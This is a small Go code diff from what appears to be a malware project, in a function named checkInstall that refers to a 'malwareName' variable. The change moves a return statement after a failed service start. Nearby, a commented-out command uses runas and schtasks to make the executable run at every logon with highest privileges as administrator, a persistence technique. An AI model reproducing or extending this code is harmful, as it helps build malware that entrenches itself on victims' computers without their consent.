@@ -175,8 +175,8 @@ func checkInstall() string {
 					err = cmd.Run()
 					if err != nil {
 						fmt.Println("Failed starting the service, Error: ", err)
-						return ""
 					}
+					return ""
 
 					// fmt.Println("Scheduling to start on login as admin")
 					// cmd := exec.Command("runas", "/user:Administrator", "schtasks /create /tn "+malwareName+" /tr "+newExeFilePath+" /sc onlogon /rl highest /f")
